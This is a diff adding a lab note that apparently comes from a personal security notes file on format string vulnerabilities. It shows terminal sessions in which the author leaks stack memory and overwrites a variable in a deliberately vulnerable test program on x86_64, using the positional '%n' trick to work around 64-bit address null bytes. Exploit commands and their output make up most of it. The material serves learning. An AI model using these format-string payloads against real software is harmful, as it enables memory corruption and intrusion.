@@ -1,3 +1,54 @@
+Shawn the R0ck - Dec 8
+
+Some werid things did happend when I tested the exp on x86_64
+platform.
+
+shawn@shawn-fortress /citypw-SCFE/security/fmt_str_vuls $ ./type2 AAAA`perl -e 'print "%x-" x 10'`
+
+&i = 0x7fffffffe3ec, value = 100
+input: AAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-
+AAAAf7ff8000-f7dd5ab0-1-f7ff8029-1-ffffe6d8-1-3-f7ffa9c0-41414141-
+&i = 0x7fffffffe3ec, value = 100
+shawn@shawn-fortress /citypw-SCFE/security/fmt_str_vuls $ ./type2 "$(printf "\xec\xe3\xff\xff\xff\x7f")`perl -e 'print "%x-" x 9'`%n"
+
+&i = 0x7fffffffe3ec, value = 100
+input: �����%x-%x-%x-%x-%x-%x-%x-%x-%x-%n
+Segmentation fault
+
+What just happend? Check what instructions causes this shit:
+
+Stopped reason: SIGSEGV
+0x00007ffff7a67f19 in vfprintf () from /lib/x86_64-linux-gnu/libc.so.6
+gdb-peda$ x $rax
+0x78257fffffffe3ec:	 <Address 0x78257fffffffe3ec out of bounds>
+
+0x78257fffffffe3ec? What the hell is 0x78 and 0x25? Please type: man
+ascii. Then you will find out where the problem is. 0x78 = 'x' & 0x25
+= '%'. On 64-bit GNU/Linux, the address is 64-bit long, which means
+8-byte. The problem is the system won't use them all when
+addressing. Then blah..blah..blah...there are a bunch of theories,
+google it. Ok, the explaination is over!
+
+Let's see how to exploit it on x86_64. A old school trick is called
+dollar-trick that help. Putting the address which you need to
+overwrite at the last. The reordered the exp is the only thing you
+need to do in this case:
+
+shawn@shawn-fortress /citypw-SCFE/security/fmt_str_vuls $ ./type2 \"%11\$n\",$(printf "\xfc\xe3\xff\xff\xff\x7f")
+
+&i = 0x7fffffffe3fc, value = 100
+input: "%11$n",�����
+"",�����
+&i = 0x7fffffffe3fc, value = 1
+
+I did it-_- Thanks to MM for the discussion about this issue. And
+special thanks to bla, you have done tens of shitloads of great
+contribution to the whole community! Without your simple/elegant shit,
+I don't even know wtf is stack-base overflow.
+
+By the community, and for the community!
+
+
 Shawn the R0ck - Dec 7 2012
 
 Format string vulnerability is the kind of old school stuff. I tested
